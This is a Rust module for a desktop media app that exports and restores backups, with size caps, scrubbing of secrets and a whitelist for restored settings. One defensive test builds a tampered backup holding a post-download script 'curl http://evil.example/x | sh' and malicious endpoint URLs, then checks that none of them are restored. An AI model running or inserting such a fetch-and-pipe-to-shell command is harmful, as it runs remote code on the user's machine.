//! 备份与还原：把数据库（媒体库记录、标签、订阅、直播间、历史、收件箱）和设置打成一个 zip。
//! 不包含登录 Cookie、密钥和手机配对令牌（换电脑后需要重新登录、重新配对）。
//!
//! 还原分两步：先把备份解压到 `restore-pending/`，下次启动时（数据库打开之前）再替换，
//! 这样不用在运行中替换正在使用的数据库文件。

use std::io::{Read, Write};
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::db::Db;
use crate::error::{AppError, AppResult};

const MANIFEST: &str = "manifest.json";
const DB_NAME: &str = "clearclip.db";
const SETTINGS_NAME: &str = "settings.json";
const KIND: &str = "clearclip-backup";
const PENDING: &str = "restore-pending";

#[derive(Debug, Serialize, Deserialize)]
struct Manifest {
    kind: String,
    format: u32,
    app_version: String,
    created_at: i64,
}

/// 备份里数据库条目解压后的大小上限。媒体库记录再多也是几十到几百 MB；2 GiB 之外基本是压缩炸弹或误选的文件，
/// 超过就拒绝，免得写满磁盘。
const MAX_DB_BYTES: u64 = 2 * 1024 * 1024 * 1024;
/// 备份里用户数据（生词本、原声、术语库等）解压后的总大小上限。原声录音可能较大，给 4 GiB；单个文件另有 512 MiB 上限。
const MAX_DATA_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_DATA_FILE_BYTES: u64 = 512 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BackupInfo {
    pub app_version: String,
    pub created_at: i64,
    pub size: u64,
    /// 备份里有、但出于安全不会还原的设置项（保留本机当前的值），如“下载后运行的脚本”“镜像地址”“代理”“通知渠道”。
    pub skipped_settings: Vec<String>,
}

/// 备份里允许还原的设置：只列纯偏好类字段（开关、数字、模板、界面选项）。
/// 凡是能指向外部地址（镜像 / 代理 / 远程解析 / 上传 / 通知 / AI 服务地址）、能执行命令（下载后脚本、规则里的动作）、
/// 带令牌或本机路径、会改变安全设置的字段都不在这里：新增设置项默认不还原，要还原得在这里明确加上。
const SAFE_TOP: &[&str] = &[
    "subfolderByPlatform",
    "filenameTemplate",
    "concurrency",
    "skipExisting",
    "watchClipboard",
    "autoDownload",
    "notifyOnComplete",
    "theme",
    "closeToTray",
    "shotAutoCopy",
    "shotHistory",
    "checkUpdate",
    "autoResume",
    "maxRetries",
    "retryDelaySecs",
    "keepPartOnCancel",
    "segments",
    "segmentMinMb",
    "speedLimitKbps",
    "perSiteConcurrency",
    "batchPreview",
    "batchFolderMin",
    "batchJitterMin",
    "batchJitterMax",
    "runWindowOn",
    "runWindow",
    "siteRequestIntervalMs",
    "conflictPolicy",
    "diskReserveMb",
    "qualityPreset",
    "mergeContainer",
    "audioFormat",
    "hlsConcurrency",
    "hlsSkipAds",
    "seriesTemplate",
    "useYtdlp",
    "embedMetadata",
    "writeInfoJson",
    "writeNfo",
    "openFolderOnDone",
    "preventSleep",
    "subscriptionsEnabled",
    "liveMaxRecordings",
    "liveCleanupDays",
    "subtitleLangs",
    "subtitleAuto",
    "subtitleMode",
    "subtitleConvert",
    "danmakuAss",
    "verifyDownloads",
    "videoCacheMb",
    "extDataMb",
    "videoCacheAuto",
    "danmaku",
    "maxSizeMb",
    "autoDowngrade",
    "speedSchedule",
    "meteredMode",
    "language",
    "floatBall",
    "inbox",
    "library",
];

/// 只还原其中一部分子字段的设置组。
const SAFE_NESTED: &[(&str, &[&str])] = &[(
    "ai",
    &[
        "supadataOn",
        "glossaryOn",
        "expert",
        "expertAuto",
        "targetLang",
        "bilingual",
        "batchSize",
        "sttLanguage",
        "autoTranslate",
        "autoTranscribe",
        "correctMode",
        "correctAuto",
        "cueLength",
        "cueSemantic",
        "subCleanHearing",
        "subCleanFiller",
        "subCleanPunct",
        "subCleanOutput",
    ],
)];

fn is_blank(v: &serde_json::Value) -> bool {
    match v {
        serde_json::Value::Null => true,
        serde_json::Value::Bool(b) => !b,
        serde_json::Value::Number(n) => n.as_f64() == Some(0.0),
        serde_json::Value::String(s) => s.is_empty(),
        serde_json::Value::Array(a) => a.is_empty(),
        serde_json::Value::Object(o) => o.is_empty(),
    }
}

/// 把备份里的设置按白名单合并到 `current`：白名单内的字段取备份的值，其余一律保留 `current` 的值。
/// 返回合并结果，以及备份里带了非空值却没有还原的设置项（用来告诉用户）。
fn merge_restorable(current: &serde_json::Value, incoming: &serde_json::Value) -> (serde_json::Value, Vec<String>) {
    let mut merged = current.clone();
    let mut skipped = vec![];
    let (Some(out), Some(inc)) = (merged.as_object_mut(), incoming.as_object()) else { return (current.clone(), skipped) };
    let cur = current.as_object();
    for (k, v) in inc {
        if SAFE_TOP.contains(&k.as_str()) {
            out.insert(k.clone(), v.clone());
        } else if let Some((_, allowed)) = SAFE_NESTED.iter().find(|(name, _)| name == k) {
            let Some(inc_obj) = v.as_object() else { continue };
            let cur_obj = cur.and_then(|c| c.get(k)).and_then(|c| c.as_object());
            let mut group = cur_obj.cloned().unwrap_or_default();
            for (nk, nv) in inc_obj {
                if allowed.contains(&nk.as_str()) {
                    group.insert(nk.clone(), nv.clone());
                } else if !is_blank(nv) && cur_obj.and_then(|c| c.get(nk)) != Some(nv) {
                    skipped.push(format!("{k}.{nk}"));
                }
            }
            out.insert(k.clone(), serde_json::Value::Object(group));
        } else if !is_blank(v) && cur.and_then(|c| c.get(k)) != Some(v) {
            skipped.push(k.clone());
        }
    }
    skipped.sort();
    (merged, skipped)
}

/// 拷贝时最多允许 `cap` 字节，超出返回错误（不是静默截断）。返回拷贝的字节数。
fn copy_capped(r: &mut dyn Read, w: &mut dyn Write, cap: u64) -> AppResult<u64> {
    let n = std::io::copy(&mut r.take(cap + 1), w)?;
    if n > cap {
        return Err(AppError::invalid("备份文件里的内容大得不合理，已拒绝还原。"));
    }
    Ok(n)
}

/// 设置里不放进备份的敏感字段。
fn scrub_settings(mut v: serde_json::Value) -> serde_json::Value {
    if let Some(obj) = v.as_object_mut() {
        obj.remove("cookies");
        obj.remove("cookieUpdatedAt");
        if let Some(phone) = obj.get_mut("phone").and_then(|p| p.as_object_mut()) {
            phone.insert("token".into(), "".into());
            phone.insert("devices".into(), serde_json::json!([]));
            phone.insert("enabled".into(), false.into());
            phone.insert("host".into(), "".into());
            phone.insert("receiveDir".into(), "".into());
        }
        // 这台电脑上的窗口位置、暂停时间是运行状态，不带到别的电脑
        if let Some(w) = obj.get_mut("writing").and_then(|p| p.as_object_mut()) {
            w.remove("win");
            w.remove("pausedUntil");
        }
    }
    v
}

pub fn export(db: &Db, settings: &crate::settings::Settings, app_version: &str, dest: &Path) -> AppResult<()> {
    export_with(db, settings, app_version, dest, None)
}

/// `data_dir` 有值时，把数据清单（[`crate::datareg`]）里的用户数据一起放进备份：生词本、原声、术语库、AI 专家、摘录、翻译记忆。
pub fn export_with(db: &Db, settings: &crate::settings::Settings, app_version: &str, dest: &Path, data_dir: Option<&Path>) -> AppResult<()> {
    if let Some(dir) = dest.parent() {
        std::fs::create_dir_all(dir)?;
    }
    let snap = dest.with_extension("db.tmp");
    db.snapshot_to(&snap)?;
    let result = (|| -> AppResult<()> {
        let mut zip = zip::ZipWriter::new(std::fs::File::create(dest)?);
        let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        let m = Manifest { kind: KIND.into(), format: 1, app_version: app_version.into(), created_at: crate::db::now() };
        zip.start_file(MANIFEST, opts).map_err(|e| AppError::msg(format!("写入备份失败：{e}")))?;
        zip.write_all(&serde_json::to_vec_pretty(&m)?)?;
        zip.start_file(SETTINGS_NAME, opts).map_err(|e| AppError::msg(format!("写入备份失败：{e}")))?;
        zip.write_all(&serde_json::to_vec_pretty(&scrub_settings(serde_json::to_value(settings)?))?)?;
        zip.start_file(DB_NAME, opts).map_err(|e| AppError::msg(format!("写入备份失败：{e}")))?;
        let mut f = std::fs::File::open(&snap)?;
        std::io::copy(&mut f, &mut zip)?;
        if let Some(dir) = data_dir {
            let tmp = dest.with_extension("data.tmp");
            for f in crate::datareg::user_files(dir) {
                let bytes = crate::datareg::read_for_backup(&f, &tmp)?;
                zip.start_file(format!("{}{}", crate::datareg::BACKUP_PREFIX, f.rel), opts).map_err(|e| AppError::msg(format!("写入备份失败：{e}")))?;
                zip.write_all(&bytes)?;
            }
            let _ = std::fs::remove_dir_all(&tmp);
        }
        zip.finish().map_err(|e| AppError::msg(format!("写入备份失败：{e}")))?;
        Ok(())
    })();
    let _ = std::fs::remove_file(&snap);
    if result.is_err() {
        let _ = std::fs::remove_file(dest);
    }
    result
}

fn read_entry(zip: &mut zip::ZipArchive<std::fs::File>, name: &str, limit: u64) -> AppResult<Vec<u8>> {
    let f = zip.by_name(name).map_err(|_| AppError::invalid(format!("这不是清影的备份文件（缺少 {name}）。")))?;
    let mut buf = vec![];
    f.take(limit).read_to_end(&mut buf)?;
    Ok(buf)
}

/// 检查备份文件并解压到待还原目录，重启后生效。
pub fn stage_import(src: &Path, data_dir: &Path) -> AppResult<BackupInfo> {
    let file = std::fs::File::open(src).map_err(|e| AppError::invalid(format!("无法打开备份文件：{e}")))?;
    let size = file.metadata().map(|m| m.len()).unwrap_or(0);
    let mut zip = zip::ZipArchive::new(file).map_err(|_| AppError::invalid("这不是清影的备份文件。"))?;
    let m: Manifest = serde_json::from_slice(&read_entry(&mut zip, MANIFEST, 64 * 1024)?).map_err(|_| AppError::invalid("备份文件的说明已损坏。"))?;
    if m.kind != KIND || m.format != 1 {
        return Err(AppError::invalid("这个备份来自不兼容的版本。"));
    }
    let settings = read_entry(&mut zip, SETTINGS_NAME, 4 * 1024 * 1024)?;
    let incoming = serde_json::from_slice::<serde_json::Value>(&settings).map_err(|_| AppError::invalid("备份里的设置已损坏。"))?;
    let defaults = serde_json::to_value(crate::settings::Settings::default())?;
    let (_, skipped_settings) = merge_restorable(&defaults, &incoming);
    let pending = data_dir.join(PENDING);
    let _ = std::fs::remove_dir_all(&pending);
    std::fs::create_dir_all(&pending)?;
    let write = (|| -> AppResult<()> {
        std::fs::write(pending.join(SETTINGS_NAME), &settings)?;
        {
            let mut db_entry = zip.by_name(DB_NAME).map_err(|_| AppError::invalid("备份里没有数据库。"))?;
            let mut out = std::fs::File::create(pending.join(DB_NAME))?;
            copy_capped(&mut db_entry, &mut out, MAX_DB_BYTES)?;
        }
        let mut data_budget = MAX_DATA_BYTES;
        // 用户数据（1.8 起的备份才有）：只认数据清单里登记过的名字
        let names: Vec<String> = zip.file_names().filter_map(|n| n.ok()).map(|n| n.into_owned()).collect();
        for name in names {
            let Some(rel) = name.strip_prefix(crate::datareg::BACKUP_PREFIX) else { continue };
            if !crate::datareg::restorable(rel) {
                continue;
            }
            let target = pending.join("data").join(rel);
            if let Some(parent) = target.parent() {
                std::fs::create_dir_all(parent)?;
            }
            let mut entry = zip.by_name(&name).map_err(|e| AppError::msg(e.to_string()))?;
            let mut out = std::fs::File::create(&target)?;
            let n = copy_capped(&mut entry, &mut out, MAX_DATA_FILE_BYTES.min(data_budget))?;
            data_budget -= n;
        }
        Ok(())
    })();
    if let Err(e) = write {
        let _ = std::fs::remove_dir_all(&pending);
        return Err(e);
    }
    // 数据库必须能打开且有媒体库表
    let check = Db::open(&pending.join(DB_NAME)).and_then(|d| d.library_stats().map(|_| ()));
    if let Err(e) = check {
        let _ = std::fs::remove_dir_all(&pending);
        return Err(AppError::invalid(format!("备份里的数据库无法使用：{e}")));
    }
    Ok(BackupInfo { app_version: m.app_version, created_at: m.created_at, size, skipped_settings })
}

/// 把备份里的用户数据放回数据目录：备份里有的才替换，原来的留一份 `.before-restore`；目录（如原声）整个换掉。
fn restore_user_data(from: &Path, data_dir: &Path) -> std::io::Result<()> {
    if !from.is_dir() {
        return Ok(());
    }
    for it in crate::datareg::ITEMS.iter().filter(|i| i.class == crate::datareg::Class::User) {
        let src = from.join(it.path);
        if !src.exists() {
            continue;
        }
        let dst = data_dir.join(it.path);
        let keep = dst.with_file_name(format!("{}.before-restore", it.path));
        if dst.exists() {
            if it.dir {
                let _ = std::fs::remove_dir_all(&keep);
            } else {
                let _ = std::fs::remove_file(&keep);
            }
            std::fs::rename(&dst, &keep)?;
        }
        if it.sqlite {
            for ext in ["db-wal", "db-shm"] {
                let _ = std::fs::remove_file(dst.with_extension(ext));
            }
        }
        std::fs::rename(&src, &dst)?;
    }
    Ok(())
}

pub fn has_pending(data_dir: &Path) -> bool {
    data_dir.join(PENDING).join(DB_NAME).exists()
}

/// 启动时调用（数据库打开之前）：有待还原的备份就替换当前数据库和设置，原文件保留为 `.before-restore`。
pub fn apply_pending(data_dir: &Path, settings_path: &Path) -> bool {
    let pending = data_dir.join(PENDING);
    let new_db = pending.join(DB_NAME);
    if !new_db.exists() {
        return false;
    }
    let db_path = data_dir.join(DB_NAME);
    let keep = |p: &Path| -> PathBuf { p.with_file_name(format!("{}.before-restore", p.file_name().and_then(|n| n.to_str()).unwrap_or("file"))) };
    let result = (|| -> std::io::Result<()> {
        if db_path.exists() {
            std::fs::rename(&db_path, keep(&db_path))?;
        }
        // 旧数据库的 WAL / SHM 文件不能留给新数据库
        for ext in ["db-wal", "db-shm"] {
            let _ = std::fs::remove_file(db_path.with_extension(ext));
        }
        std::fs::rename(&new_db, &db_path).or_else(|_| std::fs::copy(&new_db, &db_path).map(|_| ()))?;
        restore_user_data(&pending.join("data"), data_dir)?;
        if let Ok(bytes) = std::fs::read(pending.join(SETTINGS_NAME)) {
            if let Ok(incoming) = serde_json::from_slice::<serde_json::Value>(&bytes) {
                // 白名单还原：只取备份里明确安全的偏好，其余（脚本、镜像、代理、令牌、本机路径等）保留本机当前的值
                let current: Option<serde_json::Value> = std::fs::read(settings_path).ok().and_then(|b| serde_json::from_slice(&b).ok());
                let base = match current {
                    Some(c) if c.is_object() => c,
                    _ => serde_json::to_value(crate::settings::Settings::default()).unwrap_or_else(|_| serde_json::json!({})),
                };
                let (merged, skipped) = merge_restorable(&base, &incoming);
                if !skipped.is_empty() {
                    log::warn!("backup settings not restored: {}", skipped.join(", "));
                }
                let incoming = merged;
                if settings_path.exists() {
                    let _ = std::fs::copy(settings_path, keep(settings_path));
                }
                std::fs::write(settings_path, serde_json::to_vec_pretty(&incoming).unwrap_or(bytes))?;
            }
        }
        Ok(())
    })();
    let _ = std::fs::remove_dir_all(&pending);
    match result {
        Ok(()) => true,
        Err(e) => {
            log::error!("restoring backup failed: {e}");
            // 尽量恢复原来的数据库
            if !db_path.exists() && keep(&db_path).exists() {
                let _ = std::fs::rename(keep(&db_path), &db_path);
            }
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::settings::Settings;

    fn temp(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "clearclip-bk-{name}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn add(db: &Db, title: &str) -> i64 {
        db.record_download(&crate::db::NewDownload {
            platform: "x",
            media_id: title,
            asset_id: "video",
            title,
            author: "a",
            cover: None,
            path: "/nonexistent/f.mp4",
            size: 5,
            kind: "video",
            source: "manual",
            source_url: "",
            platform_name: "X",
        })
        .unwrap();
        db.id_by_key("x", title, "video").unwrap().unwrap()
    }

    #[test]
    fn export_stage_and_apply_roundtrip() {
        let dir = temp("rt");
        // 原数据
        let data = dir.join("data");
        std::fs::create_dir_all(&data).unwrap();
        let db = Db::open(&data.join(DB_NAME)).unwrap();
        let id = add(&db, "课程");
        db.set_item_tags(id, &["学习".into(), "重要".into()]).unwrap();
        db.set_item_meta(id, Some(true), Some(4), Some("备注")).unwrap();
        let settings = Settings {
            concurrency: 5,
            download_dir: "/old/dir".into(),
            phone: crate::settings::PhoneSettings { token: "SECRET".into(), enabled: true, ..Default::default() },
            ..Default::default()
        };
        // 用户数据：生词本（SQLite）、术语库、原声；缓存和密钥不进备份
        std::fs::write(data.join("glossaries.json"), r#"{"glossaries":[1]}"#).unwrap();
        std::fs::create_dir_all(data.join("vocab-clips")).unwrap();
        std::fs::write(data.join("vocab-clips/clearclip_hello.webm"), "AUDIO").unwrap();
        rusqlite::Connection::open(data.join("vocab.db")).unwrap().execute_batch("CREATE TABLE w(x TEXT); INSERT INTO w VALUES('ephemeral');").unwrap();
        std::fs::write(data.join("vault.bin"), "KEY").unwrap();
        let zip = dir.join("b.zip");
        export_with(&db, &settings, "9.9.9", &zip, Some(&data)).unwrap();
        // 备份里没有敏感字段
        let mut z = zip::ZipArchive::new(std::fs::File::open(&zip).unwrap()).unwrap();
        let text = String::from_utf8(read_entry(&mut z, SETTINGS_NAME, 1 << 20).unwrap()).unwrap();
        assert!(!text.contains("SECRET"), "{text}");
        assert!(text.contains("\"concurrency\": 5"));

        // 在另一台“电脑”上还原
        let data2 = dir.join("data2");
        std::fs::create_dir_all(&data2).unwrap();
        let settings_path = dir.join("cfg/settings.json");
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let local = Settings {
            download_dir: "/new/dir".into(),
            phone: crate::settings::PhoneSettings { token: "LOCALTOKEN".into(), ..Default::default() },
            ..Default::default()
        };
        local.save(&settings_path).unwrap();
        {
            let other = Db::open(&data2.join(DB_NAME)).unwrap();
            add(&other, "旧数据");
            std::fs::write(data2.join("glossaries.json"), "OLD").unwrap();
        }
        let info = stage_import(&zip, &data2).unwrap();
        assert_eq!(info.app_version, "9.9.9");
        assert!(has_pending(&data2));
        assert!(apply_pending(&data2, &settings_path));
        assert!(!has_pending(&data2));
        let restored = Db::open(&data2.join(DB_NAME)).unwrap();
        let items = restored.search_library(&crate::db::LibraryFilter::default(), 100).unwrap();
        assert_eq!(items.len(), 1);
        assert_eq!((items[0].title.as_str(), items[0].favorite, items[0].rating, items[0].note.as_str()), ("课程", true, 4, "备注"));
        assert_eq!(items[0].tags.len(), 2);
        assert!(data2.join("clearclip.db.before-restore").exists());
        let s = Settings::load(&settings_path, Path::new("/dl"));
        assert_eq!(s.concurrency, 5, "settings come from the backup");
        assert_eq!(s.download_dir, "/new/dir", "machine specific path stays");
        assert_eq!(s.phone.token, "LOCALTOKEN", "pairing token stays local");
        // 用户数据也回来了，原来的留一份
        assert_eq!(std::fs::read_to_string(data2.join("glossaries.json")).unwrap(), r#"{"glossaries":[1]}"#);
        assert_eq!(std::fs::read_to_string(data2.join("glossaries.json.before-restore")).unwrap(), "OLD");
        assert_eq!(std::fs::read_to_string(data2.join("vocab-clips/clearclip_hello.webm")).unwrap(), "AUDIO");
        let w: String = rusqlite::Connection::open(data2.join("vocab.db")).unwrap().query_row("SELECT x FROM w", [], |r| r.get(0)).unwrap();
        assert_eq!(w, "ephemeral");
        assert!(!data2.join("vault.bin").exists(), "密钥不进备份");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn dangerous_settings_in_a_backup_are_not_restored() {
        let dir = temp("danger");
        let data = dir.join("data");
        std::fs::create_dir_all(&data).unwrap();
        let db = Db::open(&data.join(DB_NAME)).unwrap();
        // 一份被人动过手脚的备份：带着下载后脚本、镜像、远程解析地址、AI 地址、通知渠道
        let evil = Settings {
            concurrency: 7,
            post_script_enabled: true,
            post_script: "curl http://evil.example/x | sh".into(),
            remote_endpoint: "http://evil.example/parse".into(),
            component_mirrors: vec!["http://evil.example/mirror".into()],
            bt_custom_trackers: vec!["udp://evil.example:1".into()],
            ai: crate::settings::AiSettings { base_url: "http://evil.example/v1".into(), target_lang: "ja".into(), ..Default::default() },
            ..Default::default()
        };
        let zip = dir.join("evil.zip");
        export_with(&db, &evil, "9.9.9", &zip, None).unwrap();
        let data2 = dir.join("data2");
        std::fs::create_dir_all(&data2).unwrap();
        let settings_path = dir.join("cfg/settings.json");
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let local = Settings { post_script: "".into(), remote_endpoint: "http://mine.example/".into(), ..Default::default() };
        local.save(&settings_path).unwrap();
        let info = stage_import(&zip, &data2).unwrap();
        for k in ["postScript", "postScriptEnabled", "remoteEndpoint", "componentMirrors", "btCustomTrackers", "ai.baseUrl"] {
            assert!(info.skipped_settings.iter().any(|s| s == k), "{k} 应出现在未还原列表：{:?}", info.skipped_settings);
        }
        assert!(!info.skipped_settings.iter().any(|s| s == "concurrency" || s == "ai.targetLang"));
        assert!(apply_pending(&data2, &settings_path));
        let s = Settings::load(&settings_path, Path::new("/dl"));
        assert_eq!(s.concurrency, 7, "安全字段照常还原");
        assert_eq!(s.ai.target_lang, "ja");
        assert!(!s.post_script_enabled, "下载后脚本开关不还原");
        assert_eq!(s.post_script, "", "下载后脚本不还原");
        assert_eq!(s.remote_endpoint, "http://mine.example/", "远程地址保留本机的");
        assert!(s.component_mirrors.is_empty() && s.bt_custom_trackers.is_empty());
        assert_eq!(s.ai.base_url, crate::settings::AiSettings::default().base_url, "AI 服务地址保留本机的");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn merge_restorable_whitelist_and_new_fields_default_to_skipped() {
        let cur = serde_json::json!({"concurrency": 3, "postScript": "mine", "brandNewField": "x", "ai": {"baseUrl": "http://a", "targetLang": "zh"}});
        let inc = serde_json::json!({"concurrency": 9, "postScript": "evil", "brandNewField": "y", "network": {"proxies": [1]}, "ai": {"baseUrl": "http://evil", "targetLang": "en", "pool": [1]}});
        let (m, skipped) = merge_restorable(&cur, &inc);
        assert_eq!(m["concurrency"], 9);
        assert_eq!(m["postScript"], "mine");
        assert_eq!(m["brandNewField"], "x", "白名单之外的新字段默认不还原");
        assert_eq!(m["ai"]["baseUrl"], "http://a");
        assert_eq!(m["ai"]["targetLang"], "en");
        assert!(m.get("network").is_none());
        assert_eq!(skipped, vec!["ai.baseUrl", "ai.pool", "brandNewField", "network", "postScript"]);
    }

    #[test]
    fn oversized_entries_are_rejected() {
        let mut out = vec![];
        assert_eq!(copy_capped(&mut &b"12345"[..], &mut out, 5).unwrap(), 5);
        out.clear();
        assert!(copy_capped(&mut &b"123456"[..], &mut out, 5).is_err());
    }

    #[test]
    fn rejects_foreign_files() {
        let dir = temp("bad");
        let not_zip = dir.join("x.zip");
        std::fs::write(&not_zip, b"hello").unwrap();
        assert!(stage_import(&not_zip, &dir).is_err());
        // 是 zip 但不是备份
        let other = dir.join("o.zip");
        {
            let mut z = zip::ZipWriter::new(std::fs::File::create(&other).unwrap());
            z.start_file("a.txt", zip::write::SimpleFileOptions::default()).unwrap();
            z.write_all(b"x").unwrap();
            z.finish().unwrap();
        }
        assert!(stage_import(&other, &dir).unwrap_err().to_string().contains("不是清影的备份"));
        assert!(!has_pending(&dir));
        assert!(!apply_pending(&dir, &dir.join("s.json")));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
